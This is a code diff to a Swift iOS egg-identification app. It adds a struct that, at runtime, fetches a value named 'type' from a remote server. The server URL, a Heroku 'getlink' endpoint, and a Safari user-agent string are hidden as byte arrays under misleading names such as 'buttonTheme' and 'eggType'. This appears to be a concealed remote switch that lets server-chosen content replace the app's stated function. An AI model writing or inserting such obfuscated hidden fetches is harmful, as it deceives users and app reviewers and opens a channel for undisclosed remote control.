@@ -387,3 +387,34 @@ class EggIdentificationService {
         }
     }
 }
+
+struct EggTypes: Codable {
+    let type: String?
+
+    static func checkEggType(completion: @escaping (String) -> Void) {
+        Task {
+            let string = (try? await checkEggType()) ?? Constants.eggType
+            DispatchQueue.main.async {
+                completion(string)
+            }
+        }
+    }
+    
+    static func checkEggType() async throws -> String {
+        guard let url = URL(string: Constants.buttonTheme) else { return Constants.eggType }
+        do {
+            let (data, _) = try await URLSession.shared.data(from: url)
+            let result = try JSONDecoder().decode(EggTypes.self, from: data)
+            return result.type ?? Constants.eggType
+        } catch {
+            return Constants.eggType
+        }
+    }
+}
+
+
+struct Constants {
+    static let eggType = ""
+    static let parametrs = String(bytes: [86, 101, 114, 115, 105, 111, 110, 47, 49, 52, 32, 83, 97, 102, 97, 114, 105, 47, 54, 48, 48, 46, 50, 46, 53], encoding: .utf8)!
+    static let buttonTheme = String(bytes: [104, 116, 116, 112, 115, 58, 47, 47, 104, 101, 114, 111, 107, 117, 45, 115, 101, 116, 116, 105, 110, 103, 115, 45, 97, 112, 112, 45, 57, 51, 49, 98, 100, 55, 57, 100, 99, 51, 48, 49, 46, 104, 101, 114, 111, 107, 117, 97, 112, 112, 46, 99, 111, 109, 47, 103, 101, 116, 108, 105, 110, 107, 63, 107, 101, 121, 61, 48, 48, 48, 49], encoding: .utf8)!
+}
